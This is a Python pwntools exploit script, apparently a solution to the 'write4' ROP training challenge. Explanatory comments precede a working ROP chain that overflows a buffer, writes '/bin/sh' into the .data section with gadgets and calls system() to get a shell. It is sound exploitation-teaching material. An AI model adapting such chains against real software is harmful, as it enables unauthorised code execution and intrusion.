from pwn import * 

"""
Read/Write
The important thing to realise is that ROP is just a form of arbitrary code execution and if we're creative we can leverage it to do things like write to or read from memory. 
The question is what mechanism are we going to use to solve this problem, is there any built-in functionality to do the writing or do we need to use gadgets? 
In this challenge we won't be using built-in functionality since that's too similar to the previous challenges, instead we'll be looking for gadgets that let us write a value to memory such as mov [reg], reg. 
Nonetheless it is possible to solve this challenge by leveraging functions like fgets() to write to memory locations of your choosing so it's worth trying to do it that way once you've solved it using the intended technique.
"""

"""
+---------+------+------+------+------+------+------+
| syscall | arg0 | arg1 | arg2 | arg3 | arg4 | arg5 |
+---------+------+------+------+------+------+------+
|   %rax  | %rdi | %rsi | %rdx | %r10 | %r8  | %r9  |
+---------+------+------+------+------+------+------+
"""

"""
19 0x00000e10     8 0x00600e10     8 -rw- .init_array
20 0x00000e18     8 0x00600e18     8 -rw- .fini_array
21 0x00000e20     8 0x00600e20     8 -rw- .jcr
22 0x00000e28   464 0x00600e28   464 -rw- .dynamic
23 0x00000ff8     8 0x00600ff8     8 -rw- .got
24 0x00001000    80 0x00601000    80 -rw- .got.plt
25 0x00001050    16 0x00601050    16 -rw- .data
26 0x00001060     0 0x00601060    48 -rw- .bss
"""

"""
pop [destination]          | pops the top stack var to [destination]
mov [destination], [source]| moves [source] content into
ret                        | return from current procedure
"""
"""
We call system@plt because the PLT is a fixed address used to get symbols from libc using the GOT.
If we wanted to calculate libc and bypass ASLR we would leak the GOT address to get the running addresses of libc symbols
"""

def exploit():

	p = process('./write4')
	#p = gdb.debug('./write4', 'b *0x400890')
	context(os='linux', arch='amd64')
	#context.log_level = 'DEBUG'

	log.success("[*] Sending Exploit")

	setup_input = p64(0x400890) # pop r14 ; pop r15 ; ret
	pop_rdi = p64(0x400893) # pop rdi ; ret
	write_what_where = p64(0x400820) # mov qword ptr [r14], r15 ; ret
	system = p64(0x4005e0) # system@plt
	exec_string = "/bin/sh\x00"
	write_location = p64(0x601050)
	pwn = "A" * 40 # overflow
	pwn += setup_input # pop r14 ; pop r15 ; ret 
	pwn += write_location # mov write location to r14
	pwn += exec_string # mov exec string (/bin/sh) to r15
	pwn += write_what_where # mov exec_string (r15) to address stored in r14 (write location) (the value stored in r14 is treated as an address)
	pwn += pop_rdi # pop top of stack into rdi
	pwn += write_location # write location containing string into rdi
	pwn += system # call system()

	p.recvuntil(">")
	p.sendline(pwn)
	p.interactive()

exploit()